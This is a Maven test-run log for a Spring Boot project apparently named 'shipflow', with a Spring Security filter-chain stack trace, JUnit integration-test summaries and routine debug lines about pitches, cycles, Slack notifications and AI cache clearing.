	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroStatusTests.cannotOpenClosedRetro(RetroControllerIntegrationTest.java:251) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.022 s -- in com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroStatusTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroCrudTests
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.035 s -- in com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroCrudTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.188 s -- in com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.EvidenceControllerIntegrationTest
2026-01-17T23:26:46.999Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling evidence event for evidence ID: 7
2026-01-17T23:26:47.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: evidence_7_0
2026-01-17T23:26:47.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested evidence: ID: 7
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.048 s -- in com.github.farzadsedaghatbin.shipflow.controller.EvidenceControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CycleControllerIntegrationTest
2026-01-17T23:26:47.029Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.041Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.049Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.055Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.064Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.068Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.070Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : No active Slack configuration found, skipping notification
2026-01-17T23:26:47.070Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created cycle phase change notifications for cycle 105 (BUILD→COOLDOWN) - 0 users notified
2026-01-17T23:26:47.073Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.083Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
[INFO] Tests run: 13, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.076 s -- in com.github.farzadsedaghatbin.shipflow.controller.CycleControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.PitchControllerIntegrationTest
2026-01-17T23:26:47.095Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.096Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 109
2026-01-17T23:26:47.108Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.108Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling pitch event for pitch ID: 91
2026-01-17T23:26:47.115Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: pitch_91_0
2026-01-17T23:26:47.115Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested pitch: New Pitch (ID: 91)
2026-01-17T23:26:47.122Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.security.PermissionAspect        : RBAC check skipped (disabled in configuration)
2026-01-17T23:26:47.122Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling pitch event for pitch ID: 92
2026-01-17T23:26:47.129Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: pitch_92_0
2026-01-17T23:26:47.129Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested pitch: Updated Pitch (ID: 92)
2026-01-17T23:26:47.129Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 92
2026-01-17T23:26:47.129Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 112
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.052 s -- in com.github.farzadsedaghatbin.shipflow.controller.PitchControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.GitHubIntegrationControllerTest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:47.152Z  INFO 89700 --- [shipflow] [           main] .g.f.s.c.GitHubIntegrationControllerTest : Starting GitHubIntegrationControllerTest using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:47.152Z DEBUG 89700 --- [shipflow] [           main] .g.f.s.c.GitHubIntegrationControllerTest : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:47.152Z  INFO 89700 --- [shipflow] [           main] .g.f.s.c.GitHubIntegrationControllerTest : No active profile set, falling back to 1 default profile: "default"
2026-01-17T23:26:47.330Z  WARN 89700 --- [shipflow] [           main] .s.s.UserDetailsServiceAutoConfiguration : 

Using generated security password: 2897c844-535b-4100-9211-1ccf9c119992

This generated password is for development use only. Your security configuration must be updated before running your application in production.

2026-01-17T23:26:47.331Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.JwtAuthenticationFilter        : Filter 'jwtAuthenticationFilter' configured for use
2026-01-17T23:26:47.333Z  INFO 89700 --- [shipflow] [           main] .g.f.s.c.GitHubIntegrationControllerTest : Started GitHubIntegrationControllerTest in 0.187 seconds (process running for 32.785)
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.206 s -- in com.github.farzadsedaghatbin.shipflow.controller.GitHubIntegrationControllerTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.AICacheControllerIntegrationTest
2026-01-17T23:26:47.353Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.354Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:47.354Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.354Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.controller.AICacheController     : Risk analysis cache cleared by user request
